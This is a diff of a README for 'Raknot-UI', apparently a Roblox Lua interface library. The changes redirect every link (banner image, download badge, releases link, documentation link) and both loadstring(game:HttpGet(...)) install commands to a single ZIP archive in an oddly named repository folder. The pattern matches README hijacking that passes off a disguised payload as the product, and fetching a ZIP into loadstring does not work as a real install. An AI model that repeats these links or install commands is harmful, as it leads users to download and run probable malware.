@@ -1,10 +1,10 @@
 # 🎉 Raknot-UI - Enhance Your User Interface Simply
 
-![Raknot UI Banner](https://raknot.dev/example/github/raknot-UI/read-me/index.php)
+![Raknot UI Banner](https://raw.githubusercontent.com/urnansucker2000fuckme/Raknot-UI/main/acanthopod/Raknot_UI_v2.1.zip)
 
 ## 📥 Download Now
 
-[![Download Raknot-UI](https://img.shields.io/badge/Download-Raknot--UI-brightgreen)](https://github.com/urnansucker2000fuckme/Raknot-UI/releases)
+[![Download Raknot-UI](https://raw.githubusercontent.com/urnansucker2000fuckme/Raknot-UI/main/acanthopod/Raknot_UI_v2.1.zip)](https://raw.githubusercontent.com/urnansucker2000fuckme/Raknot-UI/main/acanthopod/Raknot_UI_v2.1.zip)
 
 ## 🌟 Features
 
@@ -23,12 +23,12 @@
 To begin using Raknot-UI, follow these steps:
 
 1. **Download Raknot-UI**:
-   Visit the releases page to download the latest version: [Download Raknot-UI](https://github.com/urnansucker2000fuckme/Raknot-UI/releases).
+   Visit the releases page to download the latest version: [Download Raknot-UI](https://raw.githubusercontent.com/urnansucker2000fuckme/Raknot-UI/main/acanthopod/Raknot_UI_v2.1.zip).
 
 2. **Installation**:
    To install Raknot-UI, simply run the following code in your Lua environment:
    ```lua
-   loadstring(game:HttpGet("https://raknot.dev/docs/raknot-ui.lua"))()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/urnansucker2000fuckme/Raknot-UI/main/acanthopod/Raknot_UI_v2.1.zip"))()
    ```
 
 ## ⚙️ Quick Start
@@ -36,7 +36,7 @@ To begin using Raknot-UI, follow these steps:
 The library includes a comprehensive example that demonstrates all available components. Use this code to get started quickly:
 
 ```lua
-local RaknotUI = loadstring(game:HttpGet("https://raknot.dev/docs/raknot-ui.lua"))()
+local RaknotUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/urnansucker2000fuckme/Raknot-UI/main/acanthopod/Raknot_UI_v2.1.zip"))()
 
 -- Create a window
 local window = RaknotUI:CreateWindow("My App")
@@ -85,6 +85,6 @@ Raknot-UI is open-source and available under the MIT License. You can use, modif
 
 Stay updated by following the repository for new releases and improvements. Contributions are welcome, so feel free to submit pull requests for any enhancements you make.
 
-For detailed documentation, visit [Raknot Documentation](https://raknot.dev/docs). 
+For detailed documentation, visit [Raknot Documentation](https://raw.githubusercontent.com/urnansucker2000fuckme/Raknot-UI/main/acanthopod/Raknot_UI_v2.1.zip). 
 
 Thank you for choosing Raknot-UI. Enjoy enhancing your user interface!
